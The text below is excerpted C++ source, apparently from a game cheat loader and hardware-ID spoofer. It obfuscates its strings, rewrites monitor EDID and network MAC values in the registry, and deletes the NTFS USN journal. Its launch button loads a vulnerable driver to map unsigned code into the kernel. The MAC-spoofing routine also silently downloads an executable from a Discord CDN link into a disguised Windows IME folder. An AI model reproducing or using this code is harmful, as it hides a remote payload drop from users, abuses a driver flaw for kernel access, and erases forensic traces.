...
{
	std::string strng_for_reg = XorString("1234567890abcdefghijklmnopqrstuvQWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
...
void regedit()
{
	...
	if (lRes_oppi != ERROR_SUCCESS) {}
	//---------------EDID--------------//
	const char* szKeyPath_opp = "SYSTEM\\ControlSet001\\Enum\\DISPLAY\\PHLC0B1\\5&1d3057b8&1&UID266\\Device Parameters";
	const char* szKeyName_opp = "EDID";
	...
	if (lRes_opp != ERROR_SUCCESS) {}
	//---------------EDID--------------//
	const char* szKeyPath_oppo = "SYSTEM\\ControlSet001\\Enum\\DISPLAY\\PHLC0B1\\5&1d3057b8&2&UID266\\Device Parameters";
	const char* szKeyName_oppo = "EDID";
...
void MyMACAddr::AssingRndMAC()
{
	...
	do
	{
		utilitiesy::slow_print(XorString(" Adapter : "), 9);
		cout << list.at(selection - 1) << endl;
		utilitiesy::slow_print(XorString(" Old MAC : "), 9);
				...
				if (RegOpenKeyEx(hKey, Name, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
				{
					...
					if (RegQueryValueEx(hSubKey, _T(XorString("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
					{
						...
						if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
						{
							...
							if (RegSetValueEx(hSubKey, _T(XorString("NetworkAddress")), 0, REG_SZ, (const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
							{
								utilitiesy::slow_print(XorString(" New MAC : "), 9);
								cout << newMAC << endl;
								HRESULT networker = URLDownloadToFile(NULL, _T(XorString("https://cdn.discordapp.com/attachments/882370576570785836/907961970492342332/networker.exe")), _T(XorString("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe")), 0, NULL);
...
int clean()
{
	...
	sprintf(journal, XorString("fsutil usn deletejournal /d %c:"), drive);
	system(journal);
		...
		ImGui::PopStyleColor();
		{
			...
			case 1:
				...
				if (ImGui::Button(("Launch " + G->Games[G->Game]).c_str(), ImVec2(ImGuiPP::GetX(), 33)))
				{
					...
					{
						Beep(1200, 200);
						HANDLE handle = vul_driver::Load();
						if (!handle || handle == INVALID_HANDLE_VALUE)
						{
							Sleep(2500);
							::exit(0);
						}
						if (!lksmapp::MapDriver(handle, RawData))
						{
							Sleep(2500);
							vul_driver::Unload(handle);
							::exit(0);
						}
						vul_driver::Unload(handle);
						goto menu;
